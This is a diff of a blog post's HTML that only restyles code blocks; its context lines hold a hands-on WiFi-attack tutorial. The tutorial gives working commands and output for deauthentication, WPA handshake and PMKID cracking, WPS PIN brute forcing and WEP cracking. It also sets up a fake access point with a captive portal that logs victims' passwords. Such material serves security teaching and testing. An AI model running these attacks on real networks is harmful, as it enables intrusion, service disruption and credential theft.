@@ -12,13 +12,13 @@
   <body>
 	<div class="container">
         <header>
-		<div>mmmds's blog</div>	
-         	<nav>
+		<div id="logo">mmmds's blog</div>	
+         	<nav>|
             	<a href="/">posts</a>
 				|
             	<a href="/projects/">projects</a>
 				|
-            	<a href="/about/">about</a>
+            	<a href="/about/">about</a> |
         	</nav>
         </header>
       </div>
@@ -97,7 +97,7 @@
 
 <h3 id="switch-to-monitor-mode-">Switch to monitor mode <a name="monitor-mode"></a></h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airmon-ng check kill
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airmon-ng check kill
 # ifconfig wlan0 down
 # iwconfig wlan0 mode monitor
 # ifconfig wlan0 up
@@ -105,14 +105,14 @@
 
 <h4 id="change-mac">Change MAC</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># macchanger -r wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># macchanger -r wlan0
 </code></pre></div></div>
 
 <h3 id="capturing-packets-">Capturing packets <a name="capturing-packets"></a></h3>
 
-<p><code class="highlighter-rouge">airodump-ng</code> in default configuration iterates over all channels. We can detect what APs and clients are nearby and how they are configured.</p>
+<p><code class="language-plaintext highlighter-rouge">airodump-ng</code> in default configuration iterates over all channels. We can detect what APs and clients are nearby and how they are configured.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng wlan0
 
  CH 13 ][ Elapsed: 12 s ][ 2019-11-23 08:21
 
@@ -133,14 +133,14 @@
 
 <h4 id="hidden-networks">Hidden networks</h4>
 <p>Some networks may be configured to hide their ESSID.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 7C:AA:AC:4E:2A:44  -33       13        0    0  11  270   WPA2 CCMP   PSK  &lt;length: 0&gt;
 </code></pre></div></div>
 
 <p><img src="/images/wifi/hidden1.png" alt="" /></p>
 
 <p>This value can be seen when a client connects to the AP. So we can wait or disconnect already connected client (look <a href="#deauth">deauth</a>).</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 7C:AA:AC:4E:2A:44  00:20:18:AC:EA:AA  -38    0e- 6     53      119         HOME 321
 </code></pre></div></div>
 
@@ -172,7 +172,7 @@
 
 <p>All data is visible just by switching to monitor mode. Connection to the AP is not required.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump -c 11 -w dump wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump -c 11 -w dump wlan0
 </code></pre></div></div>
 
 <p><img src="/images/wifi/open.png" alt="" /></p>
@@ -194,7 +194,7 @@
 <h4 id="cracking-">Cracking <a name="4hs-cracking"></a></h4>
 
 <p>1. Start capturing packets</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -w dump -c 10 --bssid EA:DE:07:C0:96:BC wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -w dump -c 10 --bssid EA:DE:07:C0:96:BC wlan0
 
 CH 10 ][ Elapsed: 4 s ][ 2019-11-23 08:32
                                                                                                                                                  
@@ -208,8 +208,8 @@ CH 10 ][ Elapsed: 4 s ][ 2019-11-23 08:32
 </code></pre></div></div>
 
 <p><a name="deauth"></a>
-2. Wait until any client connects OR deauthenticate a currently connected client (where <code class="highlighter-rouge">-a</code> is the AP and <code class="highlighter-rouge">-c</code> is the station)</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng --deauth 5 -a EA:DE:07:C0:96:BC -c DA:69:BA:FB:B2:9C wlan0
+2. Wait until any client connects OR deauthenticate a currently connected client (where <code class="language-plaintext highlighter-rouge">-a</code> is the AP and <code class="language-plaintext highlighter-rouge">-c</code> is the station)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng --deauth 5 -a EA:DE:07:C0:96:BC -c DA:69:BA:FB:B2:9C wlan0
 08:34:17  Waiting for beacon frame (BSSID: EA:DE:07:C0:96:BC) on channel 10
 08:34:17  Sending 64 directed DeAuth. STMAC: [DA:69:BA:FB:B2:9C] [113|70 ACKs]
 08:34:18  Sending 64 directed DeAuth. STMAC: [DA:69:BA:FB:B2:9C] [65|66 ACKs]
@@ -219,7 +219,7 @@ CH 10 ][ Elapsed: 4 s ][ 2019-11-23 08:32
 </code></pre></div></div>
 
 <p>3. Notice captured handshake</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CH 10 ][ Elapsed: 4 s ][ 2019-11-23 08:32 ][ WPA handshake: EA:DE:07:C0:96:BC
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CH 10 ][ Elapsed: 4 s ][ 2019-11-23 08:32 ][ WPA handshake: EA:DE:07:C0:96:BC
                                                                                                                                                  
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                  
@@ -227,7 +227,7 @@ CH 10 ][ Elapsed: 4 s ][ 2019-11-23 08:32
 </code></pre></div></div>
 
 <p>4. Convert captured handshake into hashcat accepted format</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aircrack-ng -b 7c:8b:ca:76:3d:86 -j 4hs.2500 dump-03.cap
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aircrack-ng -b 7c:8b:ca:76:3d:86 -j 4hs.2500 dump-03.cap
 Opening dump-03.capease wait...
 Read 892 packets.
 
@@ -262,7 +262,7 @@ Building Hashcat (3.60+) file...
 Successfully written to 4hs.2500.hccapx
 </code></pre></div></div>
 <p>5. Start hashcat cracking</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@home:~/wifi/wifi-result# hashcat -m 2500 4hs.2500.hccapx dict.txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@home:~/wifi/wifi-result# hashcat -m 2500 4hs.2500.hccapx dict.txt
 hashcat (v5.1.0) starting...
 
 [...]
@@ -278,14 +278,14 @@ Hash.Type........: WPA-EAPOL-PBKDF2
 <ul>
   <li>STA (connecting station) and AP (access point) know PMK (Pairwise Master Key):
     <ul>
-      <li><code class="highlighter-rouge">PMK = PBKDF2(HMAC−SHA1, PSK, SSID, 4096, 256)</code></li>
+      <li><code class="language-plaintext highlighter-rouge">PMK = PBKDF2(HMAC−SHA1, PSK, SSID, 4096, 256)</code></li>
     </ul>
   </li>
   <li>STA generates SNonce</li>
   <li>[Message 1] AP generates and sends ANonce</li>
   <li>STA constructs PTK (Pairwise Transient Key):
     <ul>
-      <li><code class="highlighter-rouge">PTK = hmac_sha1(key = PMK, message = ("Pairwise key expansion", sta_mac, ap_mac, snonce, anonce))</code>
+      <li><code class="language-plaintext highlighter-rouge">PTK = hmac_sha1(key = PMK, message = ("Pairwise key expansion", sta_mac, ap_mac, snonce, anonce))</code>
         <ul>
           <li>PTK encrypts and decrypts data</li>
           <li>PTK structure:
@@ -303,7 +303,7 @@ Hash.Type........: WPA-EAPOL-PBKDF2
   </li>
   <li>[Message 2] STA sends SNonce and MIC (Message Integrity Code):
     <ul>
-      <li><code class="highlighter-rouge">MIC = hmac_sha1(key = KCK, message = EAPOL_FRAME)</code></li>
+      <li><code class="language-plaintext highlighter-rouge">MIC = hmac_sha1(key = KCK, message = EAPOL_FRAME)</code></li>
       <li>sha1 for WPA2, md5 for WPA</li>
     </ul>
   </li>
@@ -322,7 +322,7 @@ Hash.Type........: WPA-EAPOL-PBKDF2
 
 <p>Script utilizing collected data, allowing to manually test a passphrase. It is a modified script taken from <a href="https://www.cyberpunk.rs/capturing-wpa-wpa2-handshake">https://www.cyberpunk.rs/capturing-wpa-wpa2-handshake</a></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hmac,hashlib,binascii,sha
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hmac,hashlib,binascii,sha
 import sys
 from pbkdf2 import PBKDF2
 
@@ -411,7 +411,7 @@ else:
 <h3 id="cracking--1">Cracking <a name="pmkid-cracking"></a></h3>
 
 <p>1. Start capturing packets</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -c 11 -w dump wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -c 11 -w dump wlan0
 
  CH 11 ][ Elapsed: 8 s ][ 2019-11-23 09:21                                         
                                                                                                                                                  
@@ -421,18 +421,18 @@ else:
 
 </code></pre></div></div>
 <p>2. Run tshark to detect PMKID in handshake.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat dump-09.cap | tshark -Y eapol -T fields -e frame.number -e frame.time_delta -e _ws.col.Source -e _ws.col.Destination -e _ws.col.Protocol -e _ws.col.Info -e wlan.rsn.ie.pmkid -n -i -
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat dump-09.cap | tshark -Y eapol -T fields -e frame.number -e frame.time_delta -e _ws.col.Source -e _ws.col.Destination -e _ws.col.Protocol -e _ws.col.Info -e wlan.rsn.ie.pmkid -n -i -
 Running as user "root" and group "root". This could be dangerous.
 Capturing on 'Standard input'
 </code></pre></div></div>
 <p>3. Wait until any client connects or initiate connection with any (even invalid) password (for example using other network interface, computer or phone)</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>49262 0.001535000 ea:de:07:c0:96:bc c7:62:23:15:dc:f2 EAPOL Key (Message 1 of 4)  22:e1:2c:ac:c2:52:8f:ff:e1:d2:ce:3e:7b:02:97:5e
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>49262 0.001535000 ea:de:07:c0:96:bc c7:62:23:15:dc:f2 EAPOL Key (Message 1 of 4)  22:e1:2c:ac:c2:52:8f:ff:e1:d2:ce:3e:7b:02:97:5e
 49269 0.001534000 c7:62:23:15:dc:f2 ea:de:07:c0:96:bc EAPOL Key (Message 2 of 4)  
 </code></pre></div></div>
 <p>If the router is not vulnerable, Message 1 will not contain PMKID column.</p>
 
 <p>4. Convert captured handshake into hashcat accepted format</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hcxpcaptool --filtermac=eade07c096bc -k pmkid.16800 dump-09.cap 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hcxpcaptool --filtermac=eade07c096bc -k pmkid.16800 dump-09.cap 
 
 reading from dump-09.cap
                                                 
@@ -476,7 +476,7 @@ summary output file(s):
 </code></pre></div></div>
 
 <p>5. Start hashcat cracking</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hashcat -a 0 -m 16800 pmkid.16800 dict.txt 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hashcat -a 0 -m 16800 pmkid.16800 dict.txt 
 hashcat (v5.1.0) starting...
 
 [...]
@@ -493,13 +493,13 @@ Hash.Type........: WPA-PMKID-PBKDF2
 
 <p>PMKID is an optional field in Message 1 of a handshake.</p>
 
-<p><code class="highlighter-rouge">PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)</code></p>
+<p><code class="language-plaintext highlighter-rouge">PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)</code></p>
 
 <p><img src="/images/wifi/pmkid.png" alt="" /></p>
 
 <p>Having PMKID is enough for offline bruteforce. We can recalculate PMK and PMKID using a passphrase candidate and compare the result with captured PMKID.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hmac,hashlib,binascii,sha
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hmac,hashlib,binascii,sha
 from pbkdf2 import PBKDF2
 
 ssid = "TP-LINK-HOME1"
@@ -524,14 +524,14 @@ print "{} == {}\n{}".format(pmkid, new_pmkid, pmkid == new_pmkid)
 
 <h3 id="decrypting-data-">Decrypting data <a name="wpa-decrypting-data"></a></h3>
 
-<p>When we have a valid passphrase and captured data (with handshake), it’s possible to decrypt it using <code class="highlighter-rouge">airdecap-ng</code></p>
+<p>When we have a valid passphrase and captured data (with handshake), it’s possible to decrypt it using <code class="language-plaintext highlighter-rouge">airdecap-ng</code></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airdecap-ng -e &lt;essid&gt; -p &lt;password&gt; dump.cap
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airdecap-ng -e &lt;essid&gt; -p &lt;password&gt; dump.cap
 </code></pre></div></div>
 
 <p>or do it directly in Wireshark.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Edit -&gt; Preferences -&gt; Protocols -&gt; IEEE 802.11 -&gt; Decryption keys: edit -&gt; wpa-pwd
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Edit -&gt; Preferences -&gt; Protocols -&gt; IEEE 802.11 -&gt; Decryption keys: edit -&gt; wpa-pwd
 </code></pre></div></div>
 
 <p><img src="/images/wifi/decrypted.png" alt="" /></p>
@@ -555,7 +555,7 @@ print "{} == {}\n{}".format(pmkid, new_pmkid, pmkid == new_pmkid)
 </ul>
 
 <p>1. Start capturing traffic to detect WPS enabled access points.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -wps wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -wps wlan0
 
 CH 10 ][ Elapsed: 16 s ][ 2019-11-23 09:40
                                                                                                                                                  
@@ -566,7 +566,7 @@ CH 10 ][ Elapsed: 16 s ][ 2019-11-23 09:40
 </code></pre></div></div>
 
 <p>2. Start attack against chosen AP.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># reaver -i wlan0 -b EA:DE:07:C0:96:BC -c 10 -K -vv
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># reaver -i wlan0 -b EA:DE:07:C0:96:BC -c 10 -K -vv
 
 Reaver v1.6.5 WiFi Protected Setup Attack Tool
 Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;
@@ -650,13 +650,13 @@ executing pixiewps -e 4f6898ac0[...]
     <ul>
       <li>E-Hash1
         <ul>
-          <li><code class="highlighter-rouge">E-Hash1 = HMAC-SHA-256(authkey) (E-S1 | PSK1 | PKE | PKR)</code></li>
+          <li><code class="language-plaintext highlighter-rouge">E-Hash1 = HMAC-SHA-256(authkey) (E-S1 | PSK1 | PKE | PKR)</code></li>
           <li>PSK1 - first part of PIN</li>
         </ul>
       </li>
       <li>E-Hash2
         <ul>
-          <li><code class="highlighter-rouge">E-Hash2 = HMAC-SHA-256(authkey) (E-S2 | PSK2 | PKE | PKR)</code></li>
+          <li><code class="language-plaintext highlighter-rouge">E-Hash2 = HMAC-SHA-256(authkey) (E-S2 | PSK2 | PKE | PKR)</code></li>
           <li>PSK2 - second part of PIN</li>
         </ul>
       </li>
@@ -690,7 +690,7 @@ executing pixiewps -e 4f6898ac0[...]
 </ul>
 
 <p>1. Start attack against desired AP.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># reaver -i wlan0 -b EA:DE:07:C0:96:BC -c 2 -vv
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># reaver -i wlan0 -b EA:DE:07:C0:96:BC -c 2 -vv
 
 Reaver v1.6.5 WiFi Protected Setup Attack Tool
 Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;
@@ -721,7 +721,7 @@ Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacne
 </code></pre></div></div>
 
 <p>In that case AP implements protection preventing from fast brute forcing. The tool can be tuned with additional advanced switches, for example:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    -L, --ignore-locks              Ignore locked state reported by the target AP
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    -L, --ignore-locks              Ignore locked state reported by the target AP
     -N, --no-nacks                  Do not send NACK messages when out of order packets are received
     -d, --delay=&lt;seconds&gt;           Set the delay between pin attempts [1]
     -T, --m57-timeout=&lt;seconds&gt;     Set the M5/M7 timeout period [0.40]
@@ -734,23 +734,23 @@ Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacne
 
 <h3 id="retrieving-passphrase-from-pin-">Retrieving passphrase from PIN <a name="wps-pin"></a></h3>
 
-<p>Usually when <code class="highlighter-rouge">reaver</code> finds PIN it also displays passphrase to the network. However, sometimes we may need to “manually” retrieve passphrase if a PIN is known to us.</p>
+<p>Usually when <code class="language-plaintext highlighter-rouge">reaver</code> finds PIN it also displays passphrase to the network. However, sometimes we may need to “manually” retrieve passphrase if a PIN is known to us.</p>
 
-<p>1. Create file <code class="highlighter-rouge">/etc/wpa_supplicant.conf</code> with followig content:</p>
+<p>1. Create file <code class="language-plaintext highlighter-rouge">/etc/wpa_supplicant.conf</code> with followig content:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctrl_interface=/var/run/wpa_supplicant
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctrl_interface=/var/run/wpa_supplicant
 ctrl_interface_group=0
 update_config=1
 </code></pre></div></div>
 
-<p>2. Start <code class="highlighter-rouge">wpa_supplicant</code> and leave it running.</p>
+<p>2. Start <code class="language-plaintext highlighter-rouge">wpa_supplicant</code> and leave it running.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf 
 Successfully initialized wpa_supplicant
 </code></pre></div></div>
 
-<p>3. Start <code class="highlighter-rouge">wpa_cli</code> and connect using known BSSID and PIN.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_cli 
+<p>3. Start <code class="language-plaintext highlighter-rouge">wpa_cli</code> and connect using known BSSID and PIN.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_cli 
 wpa_cli v2.9
 Copyright (c) 2004-2019, Jouni Malinen &lt;j@w1.fi&gt; and contributors
 
@@ -796,8 +796,8 @@ OK
 &lt;3&gt;CTRL-EVENT-CONNECTED - Connection to ea:de:07:c0:96:bc completed [id=0 id_str=]
 &gt; 
 </code></pre></div></div>
-<p>4. After successful connection, passphrase will be written to the <code class="highlighter-rouge">/etc/wpa_supplicant.conf</code> file.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat /etc/wpa_supplicant.conf 
+<p>4. After successful connection, passphrase will be written to the <code class="language-plaintext highlighter-rouge">/etc/wpa_supplicant.conf</code> file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat /etc/wpa_supplicant.conf 
 ctrl_interface=/var/run/wpa_supplicant
 ctrl_interface_group=0
 update_config=1
@@ -830,7 +830,7 @@ network={
 <h3 id="attack-">Attack <a name="wep-attack"></a></h3>
 
 <p>1. Start capturing packets</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -w dump -c 10 --bssid BD:A2:7A:3E:F0:EB wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -w dump -c 10 --bssid BD:A2:7A:3E:F0:EB wlan0
 
 CH 10 ][ Elapsed: 2 mins ][ 2019-11-23 12:27 
                                                                                                                                                  
@@ -843,7 +843,7 @@ CH 10 ][ Elapsed: 2 mins ][ 2019-11-23 12:27
  BD:A2:7A:3E:F0:EB  70:C1:F4:F4:32:AE    0    1e- 1   36345    67756  TP-LINK-HOME2
 </code></pre></div></div>
 <p>2. We need to observe how many packets we already got.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                  
  BD:A2:7A:3E:F0:EB  -34  34     1462    16203   97  10  54e  WEP  WEP    OPN  TP-LINK-HOME2
 </code></pre></div></div>
@@ -851,7 +851,7 @@ CH 10 ][ Elapsed: 2 mins ][ 2019-11-23 12:27
 
 <p>3.1. First way uses fake authentication, what associates us with AP. We need to wait until AP sends ARP packet which we will replay. It can be initiated in controlled environment by connecting local IP address.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -1 0 -e TP-LINK-HOME2 -a BD:A2:7A:3E:F0:EB -h 24:26:66:32:78:ec wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -1 0 -e TP-LINK-HOME2 -a BD:A2:7A:3E:F0:EB -h 24:26:66:32:78:ec wlan0
 12:25:39  Waiting for beacon frame (BSSID: BD:A2:7A:3E:F0:EB) on channel 10
 
 12:25:40  Sending Authentication Request (Open System)
@@ -870,7 +870,7 @@ Read 113792 packets (got 42545 ARP requests and 25019 ACKs), sent 28656 packets.
 
 <p>3.2. Second way (preferred) uses deauthentication of a connected client. After the client reconnects, we will catch and start replaying ARP packets.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -3 -b BD:A2:7A:3E:F0:EB -h 70:C1:F4:F4:32:AE wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -3 -b BD:A2:7A:3E:F0:EB -h 70:C1:F4:F4:32:AE wlan0
 The interface MAC (24:26:66:32:78:EC) doesn't match the specified MAC (-h).
      ifconfig wlan0 hw ether 70:C1:F4:F4:32:AE
 14:35:21  Waiting for beacon frame (BSSID: 7C:8B:CA:76:3D:86) on channel 10
@@ -880,18 +880,18 @@ Notice: got a deauth/disassoc packet. Is the source MAC associated ?
 Notice: got a deauth/disassoc packet. Is the source MAC associated ?
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -0 2 -a BD:A2:7A:3E:F0:EB -c 70:C1:F4:F4:32:AE wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -0 2 -a BD:A2:7A:3E:F0:EB -c 70:C1:F4:F4:32:AE wlan0
 14:35:57  Waiting for beacon frame (BSSID: BD:A2:7A:3E:F0:EB) on channel 10
 14:35:57  Sending 64 directed DeAuth. STMAC: [70:C1:F4:F4:32:AE] [ 0|47 ACKs]
 14:35:58  Sending 64 directed DeAuth. STMAC: [70:C1:F4:F4:32:AE] [29|87 ACKs]
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Read 165871 packets (got 1 ARP requests and 39619 ACKs), sent 42398 packets...(500 pps)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Read 165871 packets (got 1 ARP requests and 39619 ACKs), sent 42398 packets...(500 pps)
 </code></pre></div></div>
 
 <p>4. Start cracking when enough packets are collected (for example 20000 packets).</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aircrack-ng -a 1 -b BD:A2:7A:3E:F0:EB dump-18.cap
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aircrack-ng -a 1 -b BD:A2:7A:3E:F0:EB dump-18.cap
 Aircrack-ng 1.2 beta3
 
 
@@ -925,19 +925,19 @@ Aircrack-ng 1.2 beta3
 
 <h2 id="connecting-to-network-">Connecting to network <a name="connecting"></a></h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_supplicant -i wlan0 -c config
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_supplicant -i wlan0 -c config
 </code></pre></div></div>
 
 <h3 id="preparning-config-file">Preparning config file</h3>
 
 <h4 id="open-network">Open network</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo -e 'network = {\n  ssid = "HOME 1" \n  key_mgmt = NONE \n}' &gt; config
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo -e 'network = {\n  ssid = "HOME 1" \n  key_mgmt = NONE \n}' &gt; config
 </code></pre></div></div>
 
 <h4 id="wpawpa2">WPA/WPA2</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_passphrase "HOME 2" 12345678 &gt; config
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_passphrase "HOME 2" 12345678 &gt; config
 </code></pre></div></div>
 
 <h2 id="fake-ap-">Fake AP <a name="fake-ap"></a></h2>
@@ -945,26 +945,26 @@ Aircrack-ng 1.2 beta3
 <p>Own AP imitating original one, can be used to harvest passphrase (using social engineering) or to perform man-in-the-middle attacks.</p>
 
 <p>1. Configure static IP.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
 </code></pre></div></div>
 
 <p>2. Prepare fake captive portal.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wget https://www.shellvoide.com/media/files/rogueap.zip
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wget https://www.shellvoide.com/media/files/rogueap.zip
 # unzip rogueap.zip -d /var/www/html
 </code></pre></div></div>
 
 <p>2.1 Simplify logging.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># touch /root/log.txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># touch /root/log.txt
 # chmod +rw /root/log.txt
 </code></pre></div></div>
-<p>Add to <code class="highlighter-rouge">/var/www/html/dbconnect.php</code>:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file_put_contents("/root/log.txt", $_POST['password1'] . " | " . $_POST['password2'], FILE_APPEND);
+<p>Add to <code class="language-plaintext highlighter-rouge">/var/www/html/dbconnect.php</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file_put_contents("/root/log.txt", $_POST['password1'] . " | " . $_POST['password2'], FILE_APPEND);
 </code></pre></div></div>
 
-<p>Credentials will be saved to <code class="highlighter-rouge">/root/log.txt</code>.</p>
+<p>Credentials will be saved to <code class="language-plaintext highlighter-rouge">/root/log.txt</code>.</p>
 
-<p>2.2. Configure redirects. Add to <code class="highlighter-rouge">/etc/apache2/sites-enable/000-default.conf</code>:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  &lt;Directory /var/www/html&gt;
+<p>2.2. Configure redirects. Add to <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enable/000-default.conf</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  &lt;Directory /var/www/html&gt;
   RewriteEngine on
     RewriteCond %{REQUEST_FILENAME} !-f
     RewriteRule .* http://192.168.1.1/index.html
@@ -972,11 +972,11 @@ Aircrack-ng 1.2 beta3
 </code></pre></div></div>
 
 <p>2.3. Restart apache.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># systemctl restart apache2
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># systemctl restart apache2
 </code></pre></div></div>
 
 <p>3. Prepare and run DNS and DHCP server.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface=wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface=wlan0
 address=/#/192.168.1.1
 dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,24h
 dhcp-option=3,192.168.1.1
@@ -987,12 +987,12 @@ log-dhcp
 listen-address=127.0.0.1
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># dnsmasq -C dnsmasq.conf  -d
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># dnsmasq -C dnsmasq.conf  -d
 </code></pre></div></div>
 
 <p>4. Prepare and run AP.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface=wlan0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface=wlan0
 driver=nl80211
 ssid=Free AP
 hw_mode=g
@@ -1001,7 +1001,7 @@ macaddr_acl=0
 ignore_broadcast_ssid=0
 </code></pre></div></div>
 
